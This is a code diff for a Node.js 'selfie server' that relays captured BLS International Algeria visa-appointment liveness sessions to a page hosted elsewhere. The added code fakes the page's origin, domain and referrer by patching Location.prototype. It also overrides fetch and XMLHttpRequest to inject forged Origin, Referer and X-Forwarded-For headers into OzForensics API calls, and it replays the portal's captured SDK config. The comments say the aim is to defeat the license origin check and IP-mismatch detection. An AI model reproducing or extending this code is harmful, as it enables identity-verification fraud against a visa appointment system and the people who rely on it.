@@ -1,8 +1,21 @@
 /**
- * 2AO Selfie Server v1.1
+ * 2AO Selfie Server v1.3.1
  * Deploy on Render: https://dz34sni-26.onrender.com
  * 
- * v1.1: Added proxy field to task storage (backward compatible)
+ * v1.3.1 CRITICAL FIX:
+ *  - Replay the REAL OzLiveness.open() config captured from the BLS portal
+ *    (task.ozConfig) instead of a hardcoded guess. BLS expects the exact
+ *    config (action, result_mode, meta, etc.) it passed to the SDK → mismatch
+ *    of guessed config = "Verification Failed".
+ *  - session_token passthrough kept (if the portal ever provides one).
+ * 
+ * v1.3 FIXES:
+ *  - Forward session_token (JWT) from agent's ozConfig to OzLiveness.open()
+ * 
+ * v1.2 FIXES:
+ *  - Location.prototype spoof (fakes document.location.origin to BLS)
+ *  - Origin/Referer headers on OZ API calls (not just X-Forwarded-For)
+ *  - Consistent header injection across all OZ requests
  * 
  * Flow (uses 4-digit CODE instead of phone):
  * 1. Agent captures userId + transactionId from BLS liveness page
@@ -77,6 +90,7 @@ app.post('/task/:code', (req, res) => {
         userAgent: body.userAgent || '',
         pageUrl: body.pageUrl || '',
         verificationToken: body.verificationToken || '',
+        ozConfig: body.ozConfig || '',
         timestamp: body.timestamp || Date.now()
     };
 
@@ -150,14 +164,42 @@ app.delete('/clear/:code', (req, res) => {
 // ═══════════════════════════════════════════
 
 app.get('/oz-page', (req, res) => {
-    const { userId, transactionId, realIp, code, phone } = req.query;
+    const { userId, transactionId, realIp, code, phone, proxy } = req.query;
     const clientCode = code || phone || '';
+    
+    // ═══ v1.3.1: Replay the REAL ozConfig captured from the BLS portal ═══
+    // The agent's 2ao-page.js captures the exact config passed to
+    // OzLiveness.open() on the portal and sends it to /task/:code.
+    // We replay its serializable fields (action, result_mode, meta, ...)
+    // so the client page opens an IDENTICAL session, not a guessed one.
+    let realCfg = {};
+    let sessionToken = '';
+    const task = tasks[clientCode];
+    if (task && task.ozConfig) {
+        try {
+            const parsed = typeof task.ozConfig === 'string' ? JSON.parse(task.ozConfig) : task.ozConfig;
+            if (parsed && typeof parsed === 'object') {
+                for (const k of Object.keys(parsed)) {
+                    if (/^on_/i.test(k)) continue;
+                    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
+                    realCfg[k] = parsed[k];
+                }
+            }
+            sessionToken = parsed.session_token || '';
+            const metaKeys = realCfg.meta ? Object.keys(realCfg.meta) : [];
+            console.log(`[OZ-PAGE] ${clientCode}: real config replayed (keys: ${Object.keys(realCfg).join(',') || 'none'}) meta=${metaKeys.join(',') || '—'} session_token=${sessionToken ? '✅' : '—'}`);
+        } catch (e) {
+            console.log(`[OZ-PAGE] ${clientCode}: ozConfig parse error:`, e.message);
+        }
+    }
+    realCfg.meta = Object.assign({}, realCfg.meta && typeof realCfg.meta === 'object' ? realCfg.meta : {});
     
     const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
     const uid = escJs(userId);
     const tid = escJs(transactionId);
     const ip = escJs(realIp);
     const cd = escJs(clientCode);
+    const st = escJs(sessionToken);
 
     const html = `<!DOCTYPE html>
 <html>
@@ -200,15 +242,46 @@ body { margin: 0; background: #08090d; font-family: system-ui, sans-serif; }
     </div>
 </div>
 
+<!-- ═══ LOCATION ORIGIN SPOOF ═══ -->
+<!-- The OZ SDK checks document.location.origin against its license.
+     This page lives on onrender.com → LICENSE_ORIGIN_ERROR.
+     We patch Location.prototype BEFORE any SDK script runs so
+     the SDK sees algeria.blsinternational.com as the origin. -->
 <script>
-try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(e) {}
+(function(){
+    var B='https://algeria.blsinternational.com';
+    var H='algeria.blsinternational.com';
+    try{Object.defineProperty(window,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
+    try{Object.defineProperty(location,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
+    try{Object.defineProperty(document,'domain',{configurable:true,get:function(){return H;}});}catch(e){}
+    try{Object.defineProperty(document,'referrer',{configurable:true,get:function(){return B+'/manage-appointments';}});}catch(e){}
+    var P=window.Location&&window.Location.prototype;
+    if(P){
+        [['origin',function(){return B;}],
+        ['hostname',function(){return H;}],
+        ['host',function(){return H;}],
+        ['protocol',function(){return 'https:';}]
+        ].forEach(function(a){try{Object.defineProperty(P,a[0],{configurable:true,get:a[1]});}catch(e){}});
+    }
+    try{history.replaceState({},'', '/dza/appointment/LivenessRequest');}catch(e){}
+})();
 </script>
 
+<!-- ═══ OZ API HEADER INJECTION ═══ -->
+<!-- Intercept fetch/XHR to add Origin, Referer, X-Forwarded-For on OZ API calls.
+     Without Origin/Referer → LICENSE_ORIGIN_ERROR.
+     Without X-Forwarded-For → IP mismatch detected by OZ. -->
 <script>
 (function(){
     var REAL_IP = '${ip}';
-    if (!REAL_IP) return;
-    function isOzApi(u){ return typeof u==='string' && u.indexOf('ozforensics.com')!==-1 && u.indexOf('web-sdk.prod.cdn.spain.ozforensics.com')===-1; }
+    var BLS_ORIGIN = 'https://algeria.blsinternational.com';
+    var BLS_REFERER = 'https://algeria.blsinternational.com/manage-appointments';
+    
+    function isOzApi(u){ 
+        return typeof u==='string' && u.indexOf('ozforensics.com')!==-1 && u.indexOf('web-sdk.prod.cdn.spain.ozforensics.com')===-1; 
+    }
+    
+    // Patch fetch
     var _f = window.fetch;
     window.fetch = function(u, o) {
         o = o || {};
@@ -217,13 +290,19 @@ try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(
             if (o.headers instanceof Headers) {
                 o.headers.set('X-Forwarded-For', REAL_IP);
                 o.headers.set('X-Real-IP', REAL_IP);
+                o.headers.set('Origin', BLS_ORIGIN);
+                o.headers.set('Referer', BLS_REFERER);
             } else {
                 o.headers['X-Forwarded-For'] = REAL_IP;
                 o.headers['X-Real-IP'] = REAL_IP;
+                o.headers['Origin'] = BLS_ORIGIN;
+                o.headers['Referer'] = BLS_REFERER;
             }
         }
         return _f.call(this, u, o);
     };
+    
+    // Patch XMLHttpRequest
     var _xo = XMLHttpRequest.prototype.open;
     var _xs = XMLHttpRequest.prototype.send;
     var _xh = XMLHttpRequest.prototype.setRequestHeader;
@@ -232,6 +311,8 @@ try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(
         if (isOzApi(this._dzUrl)) {
             try { _xh.call(this, 'X-Forwarded-For', REAL_IP); } catch(e) {}
             try { _xh.call(this, 'X-Real-IP', REAL_IP); } catch(e) {}
+            try { _xh.call(this, 'Origin', BLS_ORIGIN); } catch(e) {}
+            try { _xh.call(this, 'Referer', BLS_REFERER); } catch(e) {}
         }
         return _xs.apply(this, arguments);
     };
@@ -244,7 +325,7 @@ try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(
     <input type="hidden" name="__RequestVerificationToken" value="">
 </form>
 
-<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>
+<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational3/plugin_liveness.php?ver=1.9.7-29"></script>
 
 <script>
 function showSuccess() {
@@ -284,13 +365,19 @@ window.addEventListener('load', function() {
                 return;
             }
             document.getElementById('st').textContent = '📸 Démarrage selfie...';
-            OzLiveness.open({
-                lang: 'en',
-                meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
-                overlay_options: false,
-                action: ['video_selfie_blank'],
-                result_mode: 'safe',
-                on_complete: function(r) {
+            var _st = '${st}';
+            // v1.3.1: exact config rejoué du portail BLS (action, result_mode, meta...)
+            var _ozCfg = ${JSON.stringify(realCfg).replace(/</g, '\\u003c')};
+            _ozCfg.meta = _ozCfg.meta || {};
+            if ('${uid}') _ozCfg.meta.user_id = '${uid}';
+            if ('${tid}') _ozCfg.meta.transaction_id = '${tid}';
+            if (_st) _ozCfg.session_token = _st;
+            // filet de secours si le config rejoué est vide
+            if (!_ozCfg.action) _ozCfg.action = ['video_selfie_blank'];
+            if (!_ozCfg.result_mode) _ozCfg.result_mode = 'safe';
+            if (!_ozCfg.lang) _ozCfg.lang = 'en';
+            if (typeof _ozCfg.overlay_options === 'undefined') _ozCfg.overlay_options = false;
+            _ozCfg.on_complete = function(r) {
                     var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                     if (sid) {
                         document.getElementById('st').textContent = '✅ Selfie OK!';
@@ -311,13 +398,13 @@ window.addEventListener('load', function() {
                         document.getElementById('st').textContent = 'Pas de session ID';
                         if (window.Android) window.Android.onSelfieError('No session ID');
                     }
-                },
-                on_error: function(e) {
+                };
+                _ozCfg.on_error = function(e) {
                     var msg = e && e.message ? e.message : String(e);
                     document.getElementById('st').textContent = 'Erreur: ' + msg;
                     if (window.Android) window.Android.onSelfieError(msg);
-                }
-            });
+                };
+                OzLiveness.open(_ozCfg);
         } catch(x) {
             document.getElementById('st').textContent = 'Erreur: ' + x.message;
             if (window.Android) window.Android.onSelfieError(x.message);
@@ -339,7 +426,7 @@ window.addEventListener('load', function() {
 app.get('/', (req, res) => {
     res.json({
         service: '2AO Selfie',
-        version: '1.1',
+        version: '1.3.1',
         status: 'running',
         activeTasks: Object.keys(tasks).length,
         activeResults: Object.keys(results).length,
@@ -362,7 +449,7 @@ app.get('/debug', (req, res) => {
 // START
 // ═══════════════════════════════════════════
 app.listen(PORT, () => {
-    console.log(`\n🔥 2AO Selfie Server v1.1`);
+    console.log(`\n🔥 2AO Selfie Server v1.3.1`);
     console.log(`   Port: ${PORT}`);
     console.log(`   Ready!\n`);
 });
